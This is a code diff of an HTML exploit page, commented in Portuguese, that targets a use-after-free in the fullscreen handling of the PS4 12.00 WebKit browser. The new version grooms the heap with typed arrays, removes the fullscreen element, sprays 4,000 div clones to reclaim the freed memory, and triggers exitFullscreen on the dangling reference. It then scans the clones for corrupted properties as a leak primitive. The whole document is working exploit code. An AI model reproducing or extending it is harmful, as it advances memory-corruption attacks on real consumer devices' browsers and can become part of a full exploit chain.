@@ -2,64 +2,46 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 Fullscreen UAF - v2</title>
+<title>PS4 12.00 - UAF Substitute Scanner</title>
+<style>
+    body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
+    button { padding: 15px; font-size: 16px; font-weight: bold; cursor: pointer; background: #0077cc; color: white; border: none; }
+    #log { margin-top: 20px; font-size: 16px; color: #0f0; white-space: pre-wrap; }
+    .leak { color: #ff00ff; font-weight: bold; font-size: 20px;}
+</style>
 </head>
 <body>
-  <h2>PS4 12.00 - Fullscreen UAF Test (v2)</h2>
-  <button onclick="runTest()">Iniciar Teste</button>
-  <div id="log"></div>
 
-  <script>
-const PATTERN = 2.121995791e-314;
-const BLUR_DELAY_MS = 80;
-const CORRUPTION_CHECK_DELAY_MS = 150;
+<h2>UAF Leak: Substitute Scanner</h2>
+<button onclick="runTest()">Executar Varredura (Press OPTIONS Depois)</button>
 
-let controllers = [];
+<div id="log"></div>
 
-function log(msg) {
-    try { console.log(msg); } catch(e) {}
-    document.getElementById("log").innerHTML += "<p>" + msg + "</p>";
+<script>
+let logBuffer = [];
+// Bucket global para impedir que o GC limpe nossos clones
+window.bucket = []; 
+
+function log(msg){
+    try{console.log(msg);}catch(e){}
+    document.getElementById("log").innerHTML += msg + "<br>";
 }
 
-function setupHeap() {
-    controllers = [];
-    for (let i = 0; i < 5000; i++) {
+function runTest() {
+    log("[*] Iniciando teste de substituição...");
+
+    // 1. Heap Grooming
+    let controllers = [];
+    for(let i = 0; i < 5000; i++) {
         let arr = new Float64Array(8);
         arr[0] = i;
-        arr[1] = PATTERN;
         controllers.push(arr);
     }
-    log("[*] Heap: 5000 Float64Arrays alocados (PATTERN em [1])");
-}
 
-function checkCorruption() {
-    let corrupted = 0;
-    for (let i = 0; i < controllers.length; i++) {
-        const expectedIndex = i;
-        const expectedPattern = PATTERN;
-        if (controllers[i][0] !== expectedIndex || controllers[i][1] !== expectedPattern) {
-            log("[!!!] CORRUPTION at controllers[" + i + "]"
-                + " → [0]=" + controllers[i][0]
-                + " expected=" + expectedIndex
-                + " | [1]=" + controllers[i][1]
-                + " expected=" + expectedPattern);
-            corrupted++;
-            if (corrupted >= 10) {
-                log("[!!!] Limite de relato atingido, abortando scan.");
-                break;
-            }
-        }
-    }
-    if (corrupted === 0) {
-        log("[OK] Nenhuma corrupção detectada nos arrays.");
-    } else {
-        log("[!!!] Total corrompidos: " + corrupted);
-    }
-}
-
-function setupFullscreen() {
+    // 2. Alvo do Fullscreen
     let fsTarget = document.createElement("div");
-    fsTarget.innerHTML = "<h1>FULLSCREEN ACTIVE — Pressione OPTIONS</h1>";
+    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
+    fsTarget.style.cssText = "background:black; width:100%; height:100%; position:absolute; top:0; left:0;";
     document.body.appendChild(fsTarget);
 
     if (fsTarget.webkitRequestFullscreen) {
@@ -68,55 +50,83 @@ function setupFullscreen() {
         document.documentElement.webkitRequestFullscreen?.();
     }
 
-    return fsTarget;
-}
-
-function trigger(fsTarget) {
-    log("[*] Trigger: remove() + exitFullscreen()");
-
-    const refBeforeRemove = document.webkitFullscreenElement;
-    log("[*] webkitFullscreenElement antes do remove: " + (refBeforeRemove ? "presente" : "null"));
-
-    try {
-        fsTarget.remove();
-    } catch(e) {
-        log("[ERRO] remove(): " + e);
-    }
-
-    const refAfterRemove = document.webkitFullscreenElement;
-    log("[*] webkitFullscreenElement após remove(): " + (refAfterRemove ? "AINDA PRESENTE (dangling?)" : "null"));
-
-    try {
-        if (document.webkitIsFullScreen || document.fullscreenElement || refAfterRemove) {
-            document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
-            log("[*] exitFullscreen() chamado");
-        } else {
-            log("[*] exitFullscreen() pulado (não estava em fullscreen)");
-        }
-    } catch(e) {
-        log("[ERRO] exitFullscreen(): " + e);
-    }
-
-    setTimeout(() => {
-        log("[*] Verificando corrupção de heap...");
-        checkCorruption();
-    }, CORRUPTION_CHECK_DELAY_MS);
-}
-
-function runTest() {
-    document.getElementById("log").innerHTML = "";
-    log("[*] Iniciando teste...");
-
-    setupHeap();
-    let fsTarget = setupFullscreen();
-
+    // 3. O Gatilho e a Substituição
     window.onblur = function() {
-        log("[*] onblur disparado — aguardando " + BLUR_DELAY_MS + "ms para trigger");
-        window.onblur = null;
-        setTimeout(() => trigger(fsTarget), BLUR_DELAY_MS);
+        log("[*] onblur disparado. Iniciando Reclaim...");
+
+        // Libera a memória inicial
+        controllers = null;
+        for (let i = 0; i < 20000; i++) {
+            new ArrayBuffer(0x10000);
+        }
+
+        try {
+            // A VULNERABILIDADE: Removemos o elemento
+            fsTarget.remove();
+
+            // CRÍTICO: Matamos a referência do JS para garantir que a memória seja liberada pelo GC
+            fsTarget = null; 
+
+            // SUBSTITUIÇÃO IMEDIATA (O SPRAY DO BUCKET)
+            // Criamos milhares de objetos parecidos para ocupar o buraco exato deixado pela DIV original
+            for(let i = 0; i < 4000; i++){
+                let clone = document.createElement("div");
+                clone.id = "safe_" + i;          // Marcador de integridade
+                clone.className = "safespray";   // Marcador secundário
+                clone.title = "original_title";  // Propriedade frequentemente corrompida em UAF
+                
+                window.bucket.push(clone);
+            }
+            log("[*] Bucket preenchido com " + window.bucket.length + " clones.");
+
+            // O USO DO PONTEIRO PENDURADO
+            // O WebKit tentará acessar o fsTarget, mas na verdade atingirá um dos nossos clones!
+            if (document.webkitIsFullScreen || document.fullscreenElement) {
+                document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
+            }
+        } catch(e) {
+            log("[ERRO no Gatilho] " + e);
+        }
+
+        // 4. SCANNER PROFUNDO (Procurando a Corrupção)
+        // Damos 800ms para o WebKit processar a saída do Fullscreen e (esperamos) corromper o nosso clone
+        setTimeout(() => {
+            log("---- INICIANDO SCAN DOS CLONES ----");
+            let foundCorruption = false;
+
+            for(let i = 0; i < window.bucket.length; i++){
+                let obj = window.bucket[i];
+
+                try {
+                    // Verificamos se as propriedades que definimos foram sobrescritas pelo C++
+                    if (obj.id !== "safe_" + i || obj.className !== "safespray" || obj.title !== "original_title") {
+                        log(`<span class="leak">[!!!] BINGO! CORRUPÇÃO DETECTADA NO CLONE [${i}]!</span>`);
+                        log(`<span class="leak">ID Vazado: ${obj.id}</span>`);
+                        log(`<span class="leak">Class Vazada: ${obj.className}</span>`);
+                        log(`<span class="leak">Title Vazado: ${obj.title}</span>`);
+                        foundCorruption = true;
+                        break; // Paramos no primeiro leak para não floodar
+                    }
+                } catch(e) {
+                    // Se a leitura de um objeto der erro, significa que o C++ corrompeu
+                    // a estrutura dele de forma tão violenta que o JS nem consegue ler!
+                    log(`<span class="leak">[!!!] CORRUPÇÃO ESTRUTURAL FATAL NO CLONE [${i}]! O JS falhou ao ler.</span>`);
+                    foundCorruption = true;
+                    break;
+                }
+            }
+
+            if (!foundCorruption) {
+                log("[SCAN] Nenhum clone foi corrompido visivelmente.");
+            }
+
+        }, 800);
+
+        // Removemos o location.reload() agressivo para dar tempo de lermos a tela.
+        // Se a corrupção for fatal, o navegador dará tela azul sozinho aqui.
     };
 }
-  </script>
+</script>
+
 </body>
 </html>
-
